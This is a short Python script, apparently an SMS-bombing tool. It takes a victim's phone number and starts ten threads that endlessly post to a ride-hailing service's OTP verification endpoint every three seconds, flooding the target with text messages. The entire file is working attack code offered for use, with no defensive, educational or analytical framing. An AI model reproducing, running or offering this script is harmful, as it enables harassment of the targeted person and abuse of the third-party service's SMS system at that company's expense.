import requests
import time as t
import threading as th

_phNumber = input("enter the target's phone number. e.x: 9123456789: ")
_url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
_payload = {"cellphone": "+98" + _phNumber}
def send_sms(iurl, ipayload):
    while True:
        requests.post(iurl, json=ipayload)
        t.sleep(3)

t0 = th.Thread(target=send_sms, args=(_url, _payload))
t1 = th.Thread(target=send_sms, args=(_url, _payload))
t2 = th.Thread(target=send_sms, args=(_url, _payload))
t3 = th.Thread(target=send_sms, args=(_url, _payload))
t4 = th.Thread(target=send_sms, args=(_url, _payload))
t5 = th.Thread(target=send_sms, args=(_url, _payload))
t6 = th.Thread(target=send_sms, args=(_url, _payload))
t7 = th.Thread(target=send_sms, args=(_url, _payload))
t8 = th.Thread(target=send_sms, args=(_url, _payload))
t9 = th.Thread(target=send_sms, args=(_url, _payload))
t0.start()
t1.start()
t2.start()
t3.start()
t4.start()
t5.start()
t6.start()
t7.start()
t8.start()
t9.start()
